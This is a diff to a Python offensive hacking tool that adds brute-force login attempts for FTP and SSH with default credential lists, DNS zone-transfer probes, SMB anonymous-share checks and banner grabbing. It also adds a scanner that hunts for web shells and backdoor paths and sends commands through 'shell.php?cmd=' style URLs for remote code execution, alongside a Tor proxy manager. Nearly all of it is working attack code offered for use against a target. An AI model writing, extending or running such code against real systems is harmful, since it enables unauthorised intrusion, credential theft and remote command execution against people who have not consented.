                 response = requests.get(url, timeout=3, verify=False)
-                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['login', 'admin', 'password']):
+                if response.status_code == 200 and any(indicator in response.text.lower() for indicator in ['login', 'admin', 'password', 'username']):
                     print(f"{Colors.YELLOW}[!] Admin panel found: {url}{Colors.END}")
                     return True
             except:
                 continue
         return False
     
-    def _exploit_ftp(self):
-        """FTP service exploitation"""
+    def _exploit_ftp_advanced(self):
+        """Advanced FTP exploitation"""
         try:
-            # Test anonymous login
             from ftplib import FTP
             ftp = FTP(self.target)
-            ftp.login()  # Anonymous
-            print(f"{Colors.GREEN}[+] FTP anonymous login allowed{Colors.END}")
-            ftp.quit()
-            return True
-        except:
-            print(f"{Colors.RED}[-] FTP anonymous login failed{Colors.END}")
-            return False
-    
-    def _exploit_ssh(self):
-        """SSH service exploitation"""
-        # Placeholder for SSH attacks
-        print(f"{Colors.YELLOW}[!] SSH service detected - manual credential testing recommended{Colors.END}")
-        return False
-    
-    def _exploit_telnet(self):
-        """Telnet service exploitation"""
-        print(f"{Colors.YELLOW}[!] Telnet service detected - cleartext protocol{Colors.END}")
-        return False
-    
-    def _exploit_dns(self):
-        """DNS service exploitation attempts"""
-        try:
-            # DNS cache poisoning test
-            import dns.resolver
-            resolver = dns.resolver.Resolver()
-            resolver.nameservers = [self.target]
+            
+            # Try anonymous login
             try:
-                resolver.query('test.cerberus.local', 'A')
-                print(f"{Colors.YELLOW}[!] DNS service accepting queries{Colors.END}")
+                ftp.login()  # Anonymous
+                print(f"{Colors.GREEN}[+] FTP anonymous login allowed{Colors.END}")
+                
+                # List files and look for interesting ones
+                files = ftp.nlst()
+                if files:
+                    print(f"{Colors.YELLOW}[!] FTP files: {files}{Colors.END}")
+                
+                ftp.quit()
                 return True
             except:
                 pass
-        except ImportError:
-            pass
-        print(f"{Colors.YELLOW}[!] DNS service detected - zone transfer attacks possible{Colors.END}")
+            
+            # Try common credentials
+            credentials = [
+                ('admin', 'admin'), ('ftp', 'ftp'), ('test', 'test'),
+                ('user', 'user'), ('root', 'root'), ('anonymous', 'anonymous')
+            ]
+            
+            for username, password in credentials:
+                try:
+                    ftp.login(username, password)
+                    print(f"{Colors.GREEN}[+] FTP login successful: {username}:{password}{Colors.END}")
+                    ftp.quit()
+                    return True
+                except:
+                    continue
+                    
+        except Exception as e:
+            print(f"{Colors.RED}[-] FTP exploitation failed: {str(e)}{Colors.END}")
+        
         return False
     
-    def _exploit_smb(self):
-        """SMB service exploitation"""
+    def _exploit_ssh_advanced(self):
+        """Advanced SSH exploitation"""
+        print(f"{Colors.CYAN}[>] Testing SSH with common credentials...{Colors.END}")
+        
+        # This would typically use paramiko, but for simplicity we'll just note it
+        common_creds = [
+            ('root', 'root'), ('admin', 'admin'), ('test', 'test'),
+            ('user', 'user'), ('ubuntu', 'ubuntu'), ('debian', 'debian')
+        ]
+        
+        for username, password in common_creds:
+            print(f"{Colors.YELLOW}[!] Try SSH: {username}:{password}{Colors.END}")
+            
+        print(f"{Colors.YELLOW}[!] SSH service detected - consider using hydra or medusa for brute force{Colors.END}")
+        return False
+    
+    def _exploit_dns_advanced(self):
+        """Advanced DNS exploitation"""
+        try:
+            import dns.resolver
+            import dns.zone
+            
+            resolver = dns.resolver.Resolver()
+            resolver.nameservers = [self.target]
+            
+            # Test zone transfer
+            try:
+                zone = dns.zone.from_xfr(dns.query.xfr(self.target, self.target))
+                print(f"{Colors.GREEN}[+] DNS zone transfer successful!{Colors.END}")
+                return True
+            except:
+                pass
+            
+            # Test DNS recursion
+            try:
+                resolver.query('google.com', 'A')
+                print(f"{Colors.YELLOW}[!] DNS recursion enabled{Colors.END}")
+                return True
+            except:
+                pass
+                
+        except ImportError:
+            pass
+            
+        print(f"{Colors.YELLOW}[!] DNS service detected - multiple attack vectors possible{Colors.END}")
+        return False
+    
+    def _exploit_smb_advanced(self):
+        """Advanced SMB exploitation"""
+        print(f"{Colors.CYAN}[>] Testing SMB vulnerabilities...{Colors.END}")
+        
+        # Check for anonymous access
+        try:
+            result = subprocess.run(
+                ['smbclient', '-L', f'//{self.target}', '-N'],
+                capture_output=True, text=True, timeout=10
+            )
+            if 'Sharename' in result.stdout:
+                print(f"{Colors.GREEN}[+] SMB anonymous access allowed{Colors.END}")
+                return True
+        except:
+            pass
+            
         print(f"{Colors.YELLOW}[!] SMB service detected - check for EternalBlue and anonymous shares{Colors.END}")
         return False
     
-    def _exploit_rdp(self):
-        """RDP service exploitation"""
-        print(f"{Colors.YELLOW}[!] RDP service detected - check for BlueKeep and weak credentials{Colors.END}")
+    def _exploit_rdp_advanced(self):
+        """Advanced RDP exploitation"""
+        print(f"{Colors.CYAN}[>] Testing RDP vulnerabilities...{Colors.END}")
+        
+        # Check if port is open and service is running
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.target, 3389))
+            sock.close()
+            
+            if result == 0:
+                print(f"{Colors.YELLOW}[!] RDP service active - check for BlueKeep and weak credentials{Colors.END}")
+                return True
+        except:
+            pass
+            
         return False
     
-    def _exploit_generic(self, port: int, service: str):
-        """Generic service exploitation"""
-        print(f"{Colors.YELLOW}[!] {service} on port {port} - manual investigation recommended{Colors.END}")
+    def _exploit_generic_advanced(self, port: int, service: str):
+        """Advanced generic service exploitation"""
+        print(f"{Colors.CYAN}[>] Advanced analysis for {service} on port {port}{Colors.END}")
+        
+        # Banner grabbing for more info
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((self.target, port))
+            sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            sock.close()
+            
+            if banner:
+                print(f"{Colors.YELLOW}[!] Service banner: {banner[:100]}...{Colors.END}")
+        except:
+            pass
+            
+        print(f"{Colors.YELLOW}[!] {service} on port {port} - multiple exploitation vectors possible{Colors.END}")
         return False
 
-# =============================================================================
-# EXISTING CLASSES (Enhanced)
-# =============================================================================
 
 class TorManager:
     """Manage TOR proxy connections with improved detection"""
@@ -565,11 +1239,11 @@ class NetworkScanner:
         return open_ports
 
 # =============================================================================
-# ENHANCED: CommandExecutionEngine with Intelligent RCE
+# ENHANCED: CommandExecutionEngine with Advanced RCE
 # =============================================================================
 
 class CommandExecutionEngine:
-    """ENHANCED command execution with intelligent RCE exploitation"""
+    """ENHANCED command execution with advanced RCE exploitation"""
     
     def __init__(self, target: str, port: int, found_endpoints: list = None):
         self.target = target
@@ -581,25 +1255,53 @@ class CommandExecutionEngine:
         self.working_param = None
         self.found_endpoints = found_endpoints or []
         self.rce_exploiter = IntelligentRCEExploiter(target, port)
+        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
         
     def execute_command(self, command: str) -> str:
-        """ACTUALLY EXECUTE COMMANDS using intelligent exploitation"""
+        """EXECUTE COMMANDS using advanced exploitation techniques"""
         
-        # PRIORITY 1: Use found RCE endpoints FIRST
+        # PRIORITY 1: Use found RCE endpoints with advanced techniques
         for endpoint in self.found_endpoints:
             result = self.rce_exploiter.exploit_found_endpoint(endpoint, command)
             if result and "Command execution failed" not in result:
                 return result
         
-        # PRIORITY 2: If we already found a working method, use it
+        # PRIORITY 2: Comprehensive RCE attack
+        print(f"{Colors.CYAN}[>] Launching comprehensive RCE attack...{Colors.END}")
+        comprehensive_result = self.advanced_exploiter.comprehensive_rce_attack()
+        if "successful" in comprehensive_result.lower():
+            # Try command execution after successful RCE
+            test_result = self._execute_after_rce(command)
+            if test_result:
+                return test_result
+        
+        # PRIORITY 3: If we already found a working method, use it
         if self.working_method and self.working_url:
             result = self._execute_with_known_method(command)
             if "Command execution failed" not in result:
                 return result
         
-        # PRIORITY 3: Traditional methods (fallback)
+        # PRIORITY 4: Traditional methods (fallback)
         return self._execute_traditional_methods(command)
     
+    def _execute_after_rce(self, command: str) -> str:
+        """Execute command after successful RCE establishment"""
+        # Try through various assumed vectors after RCE
+        vectors = [
+            f"http://{self.target}:{self.port}/uploads/shell.php?cmd={command}",
+            f"http://{self.target}:{self.port}/shell.php?c={command}",
+            f"http://{self.target}:{self.port}/cmd.php?cmd={command}"
+        ]
+        
+        for vector in vectors:
+            try:
+                response = self.session.get(vector, timeout=3, verify=False)
+                if self._is_valid_response(response, command):
+                    return response.text
+            except:
+                continue
+        return None
+
     def _execute_traditional_methods(self, command: str) -> str:
         """Execute using traditional exploitation methods"""
         methods = [
@@ -866,10 +1568,6 @@ class CommandExecutionEngine:
         # Generic validation
         return len(content) > 0 and len(content) < 1000 and not content.strip().startswith('<!')
 
-# =============================================================================
-# ENHANCED: RealShellManager with Intelligent RCE
-# =============================================================================
-
 class RealShellManager:
     """ENHANCED shell manager with intelligent command execution"""
     
@@ -989,6 +1687,7 @@ class RealShellManager:
         
         return real_data
 
+
 # =============================================================================
 # ENHANCED: WebVulnerabilityScanner with Immediate Exploitation
 # =============================================================================
@@ -1000,9 +1699,52 @@ class WebVulnerabilityScanner:
         self.target = target
         self.port = port
         self.session = requests.Session()
-        self.session.timeout = 2  # Shorter timeout
+        self.session.timeout = 2
         self.rce_exploiter = IntelligentRCEExploiter(target, port)
+        self.advanced_exploiter = AdvancedRCEExploiter(target, port)
         self.found_rce_endpoints = []
+        
+    def scan_rce_endpoints(self):
+        """ADVANCED RCE endpoint scanning with comprehensive exploitation"""
+        print(f"{Colors.CYAN}[>] Advanced RCE endpoint scanning...{Colors.END}")
+        
+        endpoints = [
+            '/api/v1/execute', '/api/exec', '/api/command', '/api/rce',
+            '/admin/exec', '/admin/cmd', '/admin/system', '/admin/tools',
+            '/cmd', '/exec', '/system', '/run', '/shell', '/terminal',
+            '/console', '/debug', '/debugger', '/testing',
+            '/cgi-bin/exec', '/cgi-bin/cmd', '/cgi-bin/test.cgi',
+            '/webshell', '/backdoor', '/phpbash', '/shell.php',
+            '/cmd.php', '/exec.php', '/system.php'
+        ]
+        
+        for endpoint in endpoints:
+            url = f"http://{self.target}:{self.port}{endpoint}"
+            try:
+                response = self.session.get(url, timeout=2, verify=False)
+                if response.status_code == 200:
+                    print(f"{Colors.GREEN}[!] Accessible RCE endpoint found: {endpoint}{Colors.END}")
+                    self.found_rce_endpoints.append(endpoint)
+                    
+                    # ADVANCED EXPLOITATION TESTING
+                    print(f"{Colors.CYAN}[>] Advanced exploitation testing: {endpoint}{Colors.END}")
+                    test_result = self.rce_exploiter.exploit_found_endpoint(endpoint, "whoami")
+                    if "Command execution failed" not in test_result:
+                        print(f"{Colors.GREEN}[+] SUCCESSFUL RCE via {endpoint}: {test_result}{Colors.END}")
+                        return True
+                        
+            except Exception as e:
+                continue
+        
+        # If no direct RCE, try comprehensive attack
+        if not self.found_rce_endpoints:
+            print(f"{Colors.CYAN}[>] No direct RCE endpoints, launching comprehensive attack...{Colors.END}")
+            result = self.advanced_exploiter.comprehensive_rce_attack()
+            if "successful" in result.lower():
+                print(f"{Colors.GREEN}[+] Comprehensive RCE attack successful: {result}{Colors.END}")
+                return True
+        
+        return len(self.found_rce_endpoints) > 0
         
     def scan_sql_injection(self):
         """Fast SQL injection scanning"""
